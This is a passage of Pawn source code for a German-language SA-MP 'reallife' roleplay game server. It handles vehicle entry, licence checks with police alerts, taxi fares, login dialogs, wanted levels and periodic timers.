		TelePos[playerid][1] = 0.0;
	}
	if(newstate == PLAYER_STATE_PASSENGER) // TAXI & BUSSES
	{
	    new name[MAX_PLAYER_NAME];
	    GetPlayerName(playerid, name, sizeof(name));
	    new vehicleid = GetPlayerVehicleID(playerid);
	    for(new i = 0; i < MAX_PLAYERS; i++)
	    {
	        if(IsPlayerConnected(i))
	        {
	            if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == 2 && TransportDuty[i] > 0)
	            {
	                if(GetPlayerMoneySave(playerid) < TransportValue[i])
	                {
	                    format(string, sizeof(string), "* Du brauchst $%d, um einsteigen zu können.", TransportValue[i]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						RemovePlayerFromVehicle(playerid);
	                }
	                else
	                {
	                    if(TransportDuty[i] == 1)
	                    {
	                        format(string, sizeof(string), "* Du bezahlst $%d, dem Taxifahrer.", TransportValue[i]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Kunde %s betritt dein Taxi.", name);
							SendClientMessage(i, COLOR_LIGHTBLUE, string);
							TransportTime[i] = 1;
	                    	TransportTime[playerid] = 1;
	                    	TransportCost[playerid] = TransportValue[i];
	                    	TransportCost[i] = TransportValue[i];
	                    	TransportDriver[playerid] = i;
	                    }
	                    else if(TransportDuty[i] == 2)
	                    {
	                        format(string, sizeof(string), "* Du bezahlst $%d, dem Busfahrer.", TransportValue[i]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Passagier %s betritt den Bus.", name);
							SendClientMessage(i, COLOR_LIGHTBLUE, string);
	                    }
						GivePlayerMoneySave(playerid, - TransportValue[i]);
						TransportMoney[i] += TransportValue[i];
	                }
	            }
	        }
	    }
	}
    if(newstate == PLAYER_STATE_DRIVER) //buggy dont finnish
	{// 38 / 49 / 56 = SS
		new newcar = GetPlayerVehicleID(playerid);
		new oldcar = gLastCar[playerid];



		gLastCar[playerid] = newcar;

		if(PlayerInfo[playerid][sMember] != 24)
		{
			gLastDriver[newcar] = playerid;
			gLastDriverFixed[newcar] = playerid;
		}
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
		if(IsABoat(newcar))
		{
		    if(PlayerInfo[playerid][pBoatLic] < 1)
			{
			    SendClientMessage(playerid, COLOR_GREY, " Du hast kein Bootschein, lass dich nicht erwischen!");
				for(new i=0; i<MAX_PLAYERS; i++)
				{
					if(IsACop(playerid))
						{
		    				new oschein[257];
							new sendername[MAX_PLAYER_NAME];
	                        GetPlayerName(playerid, sendername, sizeof(sendername));
							format(oschein, sizeof(oschein), "HQ: VORSICHT %s Hat keinen Bootschein und Fährt Boot!", sendername);
							SendFamilyMessage(1 && 2 && 22, COLOR_RED, oschein);
						}
				}

			}
		}
		else if(IsAPlane(newcar))
		{
		    if(PlayerInfo[playerid][pFlyLic] < 1)
			{
			    new oschein[257];
			    new sendername[MAX_PLAYER_NAME];
			    if(TakingLesson[playerid] == 1) { }
			    else
				{
					SendClientMessage(playerid, COLOR_GREY, "	Du hast keine Fluglicense !");
					SendClientMessage(playerid, COLOR_GREY, "   Wenn du erwischt wirst, wird das Folgen haben!");
                    GetPlayerName(playerid, sendername, sizeof(sendername));
				 	for(new i=0; i<MAX_PLAYERS; i++)
					{
						if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(i, 2) || IsPlayerInFrac(i, 22))
						{
                            format(oschein, sizeof(oschein), "HQ: VORSICHT %s fliegt ohne Fluglicense", sendername);
							SendClientMessage(i, COLOR_RED, oschein);
						}
					}
				}
			}
		}
		else if(IsABike(newcar))
		{
		    if(PlayerInfo[playerid][pMotoLic] < 1)
			{
			    new oschein[257];
			    new sendername[MAX_PLAYER_NAME];
			    if(TakingLesson[playerid] == 1) { }
			    else
				{
					SendClientMessage(playerid, COLOR_GREY, "   Du hast kein Motorrad Schein !");
					SendClientMessage(playerid, COLOR_GREY, "   Wenn du erwischt wirst, wird das Folgen haben!");
                    GetPlayerName(playerid, sendername, sizeof(sendername));
				 	for(new i=0; i<MAX_PLAYERS; i++)
					{
						if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(i, 2) || IsPlayerInFrac(i, 22))
						{
                            format(oschein, sizeof(oschein), "HQ: VORSICHT %s Fährt Motorrad ohne Motorrad Schein", sendername);
							SendClientMessage(i, COLOR_RED, oschein);
						}
					}
				}
			}
		}
		else if(IsARoller(newcar))
		{
		    if(PlayerInfo[playerid][pRollerLic] < 1)
		    {
				new oschein[257];
				new sendername[MAX_PLAYER_NAME];
		        if(TakingLesson[playerid] == 1)
		        {

				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Roller Schein !");
					SendClientMessage(playerid, COLOR_GREY, "   Wenn du erwischt wirst, wird das Folgen haben!");
                    GetPlayerName(playerid, sendername, sizeof(sendername));
				 	for(new i=0; i<MAX_PLAYERS; i++)
					{
						if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(i, 2) || IsPlayerInFrac(i, 22))
						{
                            format(oschein, sizeof(oschein), "HQ: VORSICHT %s fährt ohne Roller Schein Roller", sendername);
							SendClientMessage(i, COLOR_RED, oschein);
						}
					}
				}
			}
		}
		else if(IsALKW(newcar))
		{
		    if(PlayerInfo[playerid][pLKWLic] == 0)
			{
				new oschein[257];
				new sendername[MAX_PLAYER_NAME];
			    if(TakingLesson[playerid] == 0)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Du hast kein LKW Schein !");
					SendClientMessage(playerid, COLOR_GREY, "   Wenn du erwischt wirst, wird das Folgen haben!");
                    GetPlayerName(playerid, sendername, sizeof(sendername));
				 	for(new i=0; i<MAX_PLAYERS; i++)
					{
						if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(i, 2) || IsPlayerInFrac(i, 22))
						{
                            format(oschein, sizeof(oschein), "HQ: VORSICHT %s Fährt LKW ohne LKW Schein", sendername);
							SendClientMessage(i, COLOR_RED, oschein);
						}
					}
				}
			}
		}

		else if(IsANoLicVehicle(newcar)) { }
		else
		{
			if(PlayerInfo[playerid][pCarLic] < 1)
			{
			    if(PlayerDrunk[playerid] >= 5)
				{
				    WantedPoints[playerid] += 1;
					SetPlayerCriminal(playerid,255, "Betrunken am Steuer...");
//					SetPlayerWantedLevel(playerid,GetPlayerWantedLevel(playerid)+1);
				}
				new oschein[257];
				new sendername[MAX_PLAYER_NAME];
				if((TakingLesson[playerid] == 1) || 	IsPlayerNPC(playerid))
				{
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Führerschein !");
					SendClientMessage(playerid, COLOR_GREY, "   Wenn du erwischt wirst, wird das Folgen haben!");
                    GetPlayerName(playerid, sendername, sizeof(sendername));
				 	for(new i=0; i<MAX_PLAYERS; i++)
					{
						if(IsPlayerInFrac(i, 1) || IsPlayerInFrac(i, 2) || IsPlayerInFrac(i, 22)) //Unsauber
						{
                            format(oschein, sizeof(oschein), "HQ: VORSICHT %s fährt ohne Autoführerschein Auto", sendername);
							SendClientMessage(i, COLOR_RED, oschein);
						}
						return 1;
					}
				}
			}
			else if(PlayerDrunk[playerid] >= 5)
			{
			    WantedPoints[playerid] += 1;
				SetPlayerCriminal(playerid,255, "Betrunken am Steuer...");
//				SetPlayerWantedLevel(playerid,GetPlayerWantedLevel(playerid)+1);
			}
			else if(PlayerDrunk[playerid] >= 5)
			{
			    WantedPoints[playerid] += 1;
				SetPlayerCriminal(playerid,255, "Betrunken am Steuer...");
//				SetPlayerWantedLevel(playerid,GetPlayerWantedLevel(playerid)+1);
			}
		}//Done with car check

		if(GetVehicleModel(newcar) == 408)
		{
		    if(PlayerInfo[playerid][pJob] == 17)
		    {
		        if(Mullabfuhr[playerid] == 0)
		        {
		    		SendClientMessage(playerid,COLOR_YELLOW," Um deinen Dienst als Müllmann zu starten, benutze /starten");
		    	}
		    }
		    else
			{
			    SendClientMessage(playerid,COLOR_WHITE," Dieser Wagen ist nur für Müllmänner da!");
			    RemovePlayerFromVehicle(playerid);
			}
		}

		for(new v=0; v<sizeof(HafenKlause); v++)
		{
		    if(newcar == HafenKlause[v])
		    {
		        new cost = SBizzInfo[1][sbEntranceCost];
				if(GetPlayerMoneySave(playerid) >= cost)
				{
				    GivePlayerMoneySave(playerid,-cost);
				    SBizzInfo[1][sbTill] += cost;
				    format(string,sizeof(string),"Bootsfahrt:Du zahlst $%d",cost);
				    SendClientMessage(playerid,COLOR_WHITE,string);
				    //GameTextForPlayer(playerid,string,5000,3);
				}
				else
				{
				    format(string,sizeof(string)," Die Bootsfahrt kostet $%d. Du hast nicht soviel!",cost);
				    SendClientMessage(playerid,COLOR_WHITE,string);
				    RemovePlayerFromVehicle(playerid);
				}
				return 1;
		    }
		}
		if(PlayerInfo[playerid][pJob] != 16)
		{
			for(new pv = 0; pv < sizeof(PilotenVehs); pv++)
			{
			    if(newcar == PilotenVehs[pv])
			    {
			        SendClientMessage(playerid,COLOR_RED,"Du bist kein Pilot!");
			        RemovePlayerFromVehicle(playerid);
					TogglePlayerControllable(playerid,false);
					TogglePlayerControllable(playerid,true);
				}
			}
		}
		if(PlayerKarting[playerid] != 0)
		{
			new vehicle;
			vehicle = GetPlayerVehicleID(playerid);
	   		if(GetVehicleModel(vehicle) == 571)
		    {
		        PlayerInKart[playerid] = 1;
		    	KartingPlayers ++;
			}
		}
		if(IsABus(newcar) && newcar != RMBus)
		{
		    if(PlayerInfo[playerid][pJob] != 14)
		    {
		        SendClientMessage(playerid,COLOR_GREY,"   Du bist kein Busfahrer !");
		        RemovePlayerFromVehicle(playerid);
		        return 1;
		    }
		}
		if(oldcar != 301)
		{
			if((oldcar != 0) && (HireCar[playerid] != oldcar))
			{
				if(gLastDriver[oldcar] == playerid && oldcar != newcar)
				{
					gLastDriver[oldcar] = 300;
					gCarLock[oldcar] = 0;
					UnLockCar(oldcar);
				}
			}
		}
	}
	if(newstate == PLAYER_STATE_SPAWNED)
	{
		new Float: lwx, Float:lwy, Float:lwz;
		GetPlayerPos(playerid, lwx, lwy, lwz);
		if((lwz > 530.0 && PlayerInfo[playerid][pInt] == 0) || IsPlayerInRangeOfPoint(playerid,1000.0, -1041.9,-1868.4,79.1)) //the highest land point in sa = 526.8
		{
			SetPlayerSpawn(playerid);
		}
/*
		if(PlayerInfo[playerid][pDonateRank] > 0)
		{
		SetPlayerHealth(playerid, 100.0);
		}
		else
		{
		SetPlayerHealth(playerid, 50+PlayerInfo[playerid][pSHealth]);
		}
*/
		MedicBill[playerid] = 1;
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
		gPlayerSpawned[playerid] = 1;
		SafeTime[playerid] = 60;
	}
	return 1;
}

Function HireCost(carid)
{
	switch (carid)
	{
		case 69:
		{
			return 90000; //bullit
		}
		case 70:
		{
			return 130000; //infurnus
		}
		case 71:
		{
			return 100000; //turismo
		}
		case 72:
		{
			return 80000;
		}
		case 73:
		{
			return 70000;
		}
		case 74:
		{
			return 60000;
		}
	}
	return 0;
}


Function CarRespawn(carid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(IsPlayerInVehicle(i, carid) || HireCar[i] == carid)
			{
				gLastDriver[carid] = 255;
				return 0;
			}
		}
	}
	SetVehicleToRespawn(carid);
	gLastDriver[carid] = 299;
	return 1;
}

Function LockCar(carid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			SetVehicleParamsForPlayerEx(carid,i,0,1);
		}
	}
}

Function UnLockCar(carid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(!IsAPlane(carid))
			{
				SetVehicleParamsForPlayerEx(carid,i,0,0);
			}
		}
	}
}

Function InitLockDoors(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		new c;
		while (c < 254)
		{
			c++;
			if (gCarLock[c] == 1)
			{
				SetVehicleParamsForPlayer(c,playerid,0,1);
			}
		}
	}
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(IsPlayerNPC(playerid))
	{
	    SpawnPlayer(playerid);
	    return 1;
	}
	ClearChatbox(playerid,20);
	if(gPlayerAccount[playerid] == 1 && gPlayerLogged[playerid] == 0)
    {




	        if(PlayerInfo[playerid][pCheckAcc] == 0)
			{
				//ShowPlayerDialog(playerid, DIALOG_WELCOME, DIALOG_STYLE_MSGBOX, "Schwerwiegender Serverfehler", "Dein Account konnte nicht geladen werden.\nMelde dich bei der Administration falls dieses Problem in Wenigen Minuten nicht behoben ist", "Schliessen", "");
				ShowPlayerDialog(playerid, DIALOG_WELCOME, DIALOG_STYLE_MSGBOX, "Fehler", "Dein Account konnte nicht geladen werden.\nMelde dich bei der Administration falls dieses Problem in wenigen Sekunden nicht behoben ist", "Schliessen", "");
				KickEx(playerid);
				return 1;
			}
/*
			if(IsASkrupy(playerid))
	  		{

            new queryfffff[265];
            format(queryfffff, sizeof(queryfffff), "SELECT * FROM `accounts` WHERE `name` ='%s'", PlayerInfo[playerid][Name]);
            mysql_pquery(mysqlcon, queryfffff, "LoadPlayer", "i", playerid);
		//	mysql_function_query(mysqlcon,queryfffff, true, "LoadPlayer", "i",playerid);



			return 1;
 		    }*/

	        ShowPlayerDialog(playerid,DIALOG_LOGIN,DIALOG_STYLE_PASSWORD,"GTA-City Reallife Login","{FFFFFF}Willkommen auf GTA-City Reallife\nDein Account wurde in unserer Datenbank gefunden.\nDu kannst dich nun mit deinem Passwort einloggen.","Login","Abbrechen");
//          PlayAudioStreamForPlayer(playerid, "http://gta-city-reallife.de/login.mp3");
    }
    else if(gPlayerAccount[playerid] == 0 && gPlayerLogged[playerid] == 0)
    {
        if(disablereg == false)
		{
			ShowPlayerDialog(playerid, 6543, DIALOG_STYLE_MSGBOX, "Information", "{FFFFFF}Die Registration ist zurzeit ausgeschaltet!\n\nhttp://gta-reallife.de", "Verlassen", "");
//			SCM(playerid, COLOR_GREY, "Die Registration ist zurzeit ausgeschaltet!");
			KickEx(playerid);
			return 1;
		}

		else // DIALOG_REG

	    if(PlayerInfo[playerid][pCheckAcc] == 0)
		{
			//ShowPlayerDialog(playerid, DIALOG_WELCOME, DIALOG_STYLE_MSGBOX, "Schwerwiegender Serverfehler", "Aufgrund eines Schwerwiegenden Serverfehlers wird der Login zum Schutz deines Accounts gesperrt.\nMelde dich bei der Administration falls dieses Problem in Wenigen Minuten nicht behoben ist", "Schliessen", "");
			ShowPlayerDialog(playerid, DIALOG_WELCOME, DIALOG_STYLE_MSGBOX, "Fehler", "Dein Account konnte nicht geladen werden.\nMelde dich bei der Administration falls dieses Problem in Wenigen Minuten nicht behoben ist", "Schliessen", "");
			KickEx(playerid);
			return 1;
		}
        ShowPlayerDialog(playerid,DIALOG_REG2,DIALOG_STYLE_INPUT,"Account erstellen","{FFFFFF}Herzlich Willkommen auf GTA-City Reallife.\nUm fortzufahren benötigst du einen Spieler-Account.\nBitte gebe nun ein Passwort ein.","Weiter","Abbrechen");
//        PlayAudioStreamForPlayer(playerid, "http://gta-city-reallife.de/login.mp3");
	}
    SetupPlayerForClassSelection(playerid);
    return 1;
}

forward OnKicked(playerid);
public OnKicked(playerid)
{
	Kick(playerid);
}
stock KickEx(playerid)
{
	SetTimerEx("OnKicked", 20, false, "i", playerid);
	return 1;
}

Function SetupPlayerForClassSelection(playerid)
{
	if(AtClothes[playerid] == 0)
	{
		switch(random(3))
		{
		    case 0:
		    {
				SetPlayerInterior(playerid,0);
		        SetPlayerPos(playerid,1000.8105,-2192.9265,13.0859);
		        SetPlayerFacingAngle(playerid,98.5031);
		        SetPlayerCameraPos(playerid,985.5108,-2344.2390,111.5349);
		        SetPlayerCameraLookAt(playerid,968.4013,-2314.8914,95.9819);
		    }
		    case 1:
		    {
		        SetPlayerInterior(playerid,0);
		        SetPlayerPos(playerid,1000.8105,-2192.9265,13.0859);
		        SetPlayerFacingAngle(playerid,264.4628);
		        SetPlayerCameraPos(playerid,985.5108,-2344.2390,111.5349);
		        SetPlayerCameraLookAt(playerid,968.4013,-2314.8914,95.9819);
		    }
		    default:
		    {
		        SetPlayerInterior(playerid,0);
		        SetPlayerPos(playerid,1000.8105,-2192.9265,13.0859);
		        SetPlayerFacingAngle(playerid,89.4192);
		        SetPlayerCameraPos(playerid,985.5108,-2344.2390,111.5349);
		        SetPlayerCameraLookAt(playerid,968.4013,-2314.8914,95.9819);
		    }
		}
  	}
	else
 	{
    	SetPlayerInterior(playerid,14);
		SetPlayerPos(playerid,258.4893,-41.4008,1002.0234);
		SetPlayerFacingAngle(playerid, 90.0);
		SetPlayerCameraPos(playerid,256.0815,-43.000,1003.0234);
		SetPlayerCameraLookAt(playerid,258.4893,-41.4008,1002.0234);
	}
}


//---------------------------------------------------------

Function SetPlayerTeamFromClass(playerid,classid)
{
 	if (classid >= 1 && classid <= 11)
	{
		gTeam[playerid] = 11; //admin
		PlayerInfo[playerid][pTeam] = 11;
	}
	else
	{
	    gTeam[playerid] = 3;
	    PlayerInfo[playerid][pTeam] = 3;
	}
}

//---------------------------------------------------------

Function SetPlayerCriminal(playerid,declare,reason[])
{
	if(IsPlayerConnected(playerid))
	{
	    PlayerInfo[playerid][pCrimes] += 1;
		new turned[MAX_PLAYER_NAME];
		new turner[MAX_PLAYER_NAME];
		new turnmes[128];
		new wantedmes[128];
		new wlevel;
		strmid(PlayerCrime[playerid][pAccusedof], reason, 0, strlen(reason), 255);
		GetPlayerName(playerid, turned, sizeof(turned));
		if (declare == 255)
		{
			format(turner, sizeof(turner), "Unbekannt");
			strmid(PlayerCrime[playerid][pVictim], turner, 0, strlen(turner), 255);
		}
		else
		{
		    if(IsPlayerConnected(declare))
		    {
				GetPlayerName(declare, turner, sizeof(turner));
				strmid(PlayerCrime[playerid][pVictim], turner, 0, strlen(turner), 255);
				strmid(PlayerCrime[declare][pBplayer], turned, 0, strlen(turned), 255);
				strmid(PlayerCrime[declare][pAccusing], reason, 0, strlen(reason), 255);
			}
		}
		WantedLevel[playerid]++;
		wlevel = WantedLevel[playerid];
		format(turnmes, sizeof(turnmes), "Du hast ein Verbrechen begangen ( %s ). Zeuge: %s.",reason,turner);
		SendClientMessage(playerid, COLOR_RED, turnmes);
		format(wantedmes, sizeof(wantedmes), "Momentanes Wantedlevel: %d", wlevel);
		SendClientMessage(playerid, COLOR_YELLOW, wantedmes);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
   				if(IsACop(i))
			    {
					format(cbjstore, sizeof(turnmes), "HQ: Alle Einheiten: Reporter: %s",turner);
					SendClientMessage(i, TEAM_BLUE_COLOR, cbjstore);
					format(cbjstore, sizeof(turnmes), "HQ: Verbrechen: %s, Gesuchter: %s",reason,turned);
					SendClientMessage(i, TEAM_BLUE_COLOR, cbjstore);
				}
			}
		}
	}
}


//---------------------------------------------------------

Function SetPlayerFree(playerid,declare,reason[])
{
	if(IsPlayerConnected(playerid))
	{
		ClearCrime(playerid);
		new turned[MAX_PLAYER_NAME];
		new turner[MAX_PLAYER_NAME];
		new turnmes[128];
		new crbjstore[128];
		if (declare == 255)
		{
			format(turner, sizeof(turner), "911");
		}
		else
		{
		    if(IsPlayerConnected(declare))
		    {
				GetPlayerName(declare, turner, sizeof(turner));
			}
		}
		GetPlayerName(playerid, turned, sizeof(turned));
		format(turnmes, sizeof(turnmes), "SMS: %s, du wurdest eingesperrt, und bist kein Verbrecher mehr, Sender: MOLE (555)",turned);
		RingTone[playerid] = 20;
		SendClientMessage(playerid, COLOR_YELLOW, turnmes);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
			    if(PlayerInfo[i][pMember] == 1||PlayerInfo[i][pLeader] == 1)
			    {
					format(crbjstore, sizeof(crbjstore), "HQ: An alle Einheiten, %s hat den Einsatz beendet.",turner);
					SendClientMessage(i, COLOR_DBLUE, crbjstore);
					format(crbjstore, sizeof(crbjstore), "HQ: %s hat, %s bearbeitet",turned,reason);
					SendClientMessage(i, COLOR_DBLUE, crbjstore);
				}
			}
		}
	}
}

Function RingToner()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
			if(RingTone[i] != 6 && RingTone[i] != 0 && RingTone[i] < 11)
			{
				RingTone[i] = RingTone[i] -1;
				PlayerPlaySound(i, 1138, 0.0, 0.0, 0.0);
			}
			if(RingTone[i] == 6)
			{
				RingTone[i] = RingTone[i] -1;
			}
			if(RingTone[i] == 20)
			{
				RingTone[i] = RingTone[i] -1;
				PlayerPlaySound(i, 1139, 0.0, 0.0, 0.0);
			}
		}
	}
	SetTimer("RingTonerRev", 1000, 0);
	return 1;
}

Function RingTonerRev()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
			if(RingTone[i] != 5 && RingTone[i] != 0 && RingTone[i] < 10)
			{
				RingTone[i] = RingTone[i] -1;
				PlayerPlaySound(i, 1137, 0.0, 0.0, 0.0);
			}
			if(RingTone[i] == 5)
			{
				RingTone[i] = RingTone[i] -1;
			}
			if(RingTone[i] == 19)
			{
				PlayerPlaySound(i, 1139, 0.0, 0.0, 0.0);
				RingTone[i] = 0;
			}
		}
	}
	SetTimer("RingToner", 1000, 0);
	return 1;
}
Function SetPlayerUnjail()
{
//	new plname[MAX_PLAYER_NAME];
	new string[256];

	if (LottoTimer > 0)
	LottoTimer--;
	if (LottoTimer == 1)
	{
	    OOCOff(COLOR_WHITE, "[Lotto]: Die Super Ziehung wurde gestartet!");
	    new rand = random(180);
	    //if(rand < 70) { rand += 3; }
	    Lotto(rand);
	}
	if(PaintballPlayers >= 2 && PaintballRound != 1 && StartingPaintballRound != 1)
	{
		StartingPaintballRound = 1;
	   	SetTimer("PreparePaintball", 15000, 0);
	}
	if(KartingPlayers >= 2 && KartingRound != 1 && StartingKartRound != 1)
	{
	    StartingKartRound = 1;
	    SetTimer("PrepareKarting", 15000, 0);
	}
	if(KartingRound != 0 && KartingPlayers < 2)
	{
	    StartingKartRound = 0;
	    KartingRound = 0;
	    EndingKartRound = 1;
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        NDMZONE(i);
	        NagelBand_Timer();
//			new newcar = GetPlayerVehicleID(i);
			new level = PlayerInfo[i][pLevel];
			if(level >= 0 && level >= 2) { PlayerInfo[i][pPayCheck] += 1; }
			else if(level >= 3 && level <= 4) { PlayerInfo[i][pPayCheck] += 2; }
			else if(level >= 5 && level <= 6) { PlayerInfo[i][pPayCheck] += 3; }
			else if(level >= 7 && level <= 8) { PlayerInfo[i][pPayCheck] += 4; }
			else if(level >= 9 && level <= 10) { PlayerInfo[i][pPayCheck] += 5; }
			else if(level >= 11 && level <= 12) { PlayerInfo[i][pPayCheck] += 6; }
			else if(level >= 13 && level <= 14) { PlayerInfo[i][pPayCheck] += 7; }
			else if(level >= 15 && level <= 16) { PlayerInfo[i][pPayCheck] += 8; }
			else if(level >= 17 && level <= 18) { PlayerInfo[i][pPayCheck] += 9; }
			else if(level >= 19 && level <= 20) { PlayerInfo[i][pPayCheck] += 10; }
			else if(level >= 21) { PlayerInfo[i][pPayCheck] += 11; }
/*
   			if(IsPlayerInAnyVehicle(i))
		    {
   	 			new Float:health;
		   	 	new vehicle = GetPlayerVehicleID(i);
	    		GetVehicleHealth(vehicle, health);
		    	if(health < 281)
		    	{
  	    			SetVehicleToRespawn(vehicle);
				}
			}
*/
			else if (LottoTimer == 120)
			{
			    format(string, sizeof(string), "[Lotto]: Die Lotterie Ziehung beginnt in 2 Minuten, Jackpot: %d", Jackpot);
			    SendClientMessage(i,COLOR_GREEN,string);
			    SendClientMessage(i,COLOR_GREEN,"[Lotto]: Gib /Lotto [Nummer] um einen Lotterie-Schein zu kaufen.");
			}
			else if (LottoTimer == 60)
			{
			    format(string, sizeof(string), "[Lotto]: Die Lotterie Ziehung beginnt in 1 Minute, Jackpot: %d", Jackpot);
			    SendClientMessage(i,COLOR_GREEN,string);
			    SendClientMessage(i,COLOR_GREEN,"[Lotto]: Gib /Lotto [Nummer] um einen Lotterie-Schein zu kaufen.");
			}
/*
		    if(IsABoat(newcar))
			{
			    if(PlayerInfo[i][pBoatLic] < 1 && GetPlayerState(i) == 2)
				{
				    RemovePlayerFromVehicle(i);
				}
			}
			else if(IsAPlane(newcar))
			{
			    if(PlayerInfo[i][pFlyLic] < 1 && GetPlayerState(i) == 2)
				{
				    if(TakingLesson[i] == 1) { }
				    else { RemovePlayerFromVehicle(i); }
				}
			}
			else if(IsANewbie(newcar))
			{
			    if(PlayerInfo[i][pNewLic] == 0 && GetPlayerState(i) == 2) { }
    	    	if(PlayerInfo[i][pNewLic] == 0 && GetPlayerState(i) == 2) { }
			}
			else if(IsANoLicVehicle(newcar)) { }
			else
			{
				if(PlayerInfo[i][pCarLic] < 1 && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == 2)
				{
					if(TakingLesson[i] == 1) { }
				    else
				    {
				    }
				}
			}//Done with car check
*/


/*
		    if(UsedFind[i] >= 1)
		    {
		        UsedFind[i] += 1;
				if(UsedFind[i] >= 120 && PlayerInfo[pDetektivSkill] <= 35)                     // EDITIEREN
				{
				    UsedFind[i] = 0;
				}
				else if(UsedFind[i] >= 90 && PlayerInfo[pDetektivSkill] == 1)                     // EDITIEREN
				{
				    UsedFind[i] = 0;
				}
		    }*/
			if(MedicTime[i] > 0)
			{
			    if(MedicTime[i] == 3)
			    {
			        SetPlayerInterior(i, 5);
			        new Float:X, Float:Y, Float:Z;
			        GetPlayerPos(i, X,Y,Z);
			        SetPlayerCameraPos(i, X + 3, Y, Z);
			        SetPlayerCameraLookAt(i,X,Y,Z);
			    }
			    MedicTime[i] ++;
			    if(MedicTime[i] >= NeedMedicTime[i])
			    {
     				new cut = deathcost; //PlayerInfo[playerid][pLevel]*deathcost;
					GivePlayerMoneySave(i, -cut);
					UnFreezePlayer(i);
			        MedicBill[i] = 0;
			        MedicTime[i] = 0;
			        NeedMedicTime[i] = 0;
			        PlayerInfo[i][pDeaths] += 1;
//			        PlayerFixRadio(i);
			        SpawnPlayer(i);
			    }
			}
			if(PlayerTazeTime[i] >= 1)
			{
			    PlayerTazeTime[i] += 1;
			    if(PlayerTazeTime[i] == 15)
			    {
                    PlayerTazeTime[i] = 0;
			    }
			    else
			    {
			        new Float:angle;
					GetPlayerFacingAngle(i, angle);
					SetPlayerFacingAngle(i, angle + 180);
			    }
			}
			new Float:HP;
			if(GetPlayerHealth(i, HP) > 161)
			{
			    SetPlayerHealth(i, 160);
			}
			if(PlayerInfo[i][pCarTime] > 0)
			{
			    if(PlayerInfo[i][pCarTime] <= 0)
			    {
			        PlayerInfo[i][pCarTime] = 0;
			    }
			    else
			    {
			        PlayerInfo[i][pCarTime] -= 1;
			    }
			}
			if(PlayerInfo[i][pMulltime] > 0)
			{
			    if(PlayerInfo[i][pMulltime] <= 0)
			    {
			        PlayerInfo[i][pMulltime] = 0;
				}
				else
				{
				    PlayerInfo[i][pMulltime] -= 1;
				}
			}
			if(PlayerInfo[i][pFlugTime] > 0)
			{
			    if(PlayerInfo[i][pFlugTime] <= 0)
			    {
			        PlayerInfo[i][pFlugTime] = 0;
				}
				else
				{
				    PlayerInfo[i][pFlugTime] -= 1;
				}
			}
			if(PlayerInfo[i][pFarmTime] > 0)
			{
			    if(PlayerInfo[i][pFarmTime] <= 0)
			    {
			        PlayerInfo[i][pFarmTime] = 0;
				}
				else
				{
				    PlayerInfo[i][pFarmTime] = -1;
				}
			}
/*
			if(BoxWaitTime[i] > 0)
			{
			    if(BoxWaitTime[i] >= BoxDelay)
				{
				    BoxDelay = 0;
					BoxWaitTime[i] = 0;
					PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
					GameTextForPlayer(i, "~g~Match Gestartet", 5000, 1);
					UnFreezePlayer(i);
					RoundStarted = 1;
				}
			    else
				{
				    format(string, sizeof(string), "%d", BoxDelay - BoxWaitTime[i]);
					GameTextForPlayer(i, string, 1500, 6);
					BoxWaitTime[i] += 1;
				}
			}

			if(RoundStarted > 0)
			{
			    if(PlayerBoxing[i] > 0)
			    {
			        new trigger = 0;
			        new Lost = 0;
		        	new Float:angle;
		            new Float:health;
					GetPlayerHealth(i, health);
		            if(health < 12)
					{
					    if(i == Boxer1) { Lost = 1; trigger = 1; }
			            else if(i == Boxer2) { Lost = 2; trigger = 1; }
					}
			        if(health < 28) { GetPlayerFacingAngle(i, angle); SetPlayerFacingAngle(i, angle + 85); }
			        if(trigger)
			        {
			            new winner[MAX_PLAYER_NAME];
			            new loser[MAX_PLAYER_NAME];
			            new titel[MAX_PLAYER_NAME];
			            if(Lost == 1)
			            {
			                if(IsPlayerConnected(Boxer1) && IsPlayerConnected(Boxer2))
			                {
					        	SetPlayerPos(Boxer1, 765.8433,3.2924,1000.7186); SetPlayerPos(Boxer2, 765.8433,3.2924,1000.7186);
					        	SetPlayerInterior(Boxer1, 5); SetPlayerInterior(Boxer2, 5);
			                	GetPlayerName(Boxer1, loser, sizeof(loser));
			                	GetPlayerName(Boxer2, winner, sizeof(winner));
		                		if(PlayerInfo[Boxer1][pJob] == 12) { PlayerInfo[Boxer1][pLoses] += 1; }
								if(PlayerInfo[Boxer2][pJob] == 12) { PlayerInfo[Boxer2][pWins] += 1; }
			                	if(TBoxer < 255)
			                	{
			                	    if(IsPlayerConnected(TBoxer))
			                	    {
				                	    if(TBoxer != Boxer2)
				                	    {
				                	        if(PlayerInfo[Boxer2][pJob] == 10)
				                	        {
				                	            TBoxer = Boxer2;
				                	            GetPlayerName(TBoxer, titel, sizeof(titel));
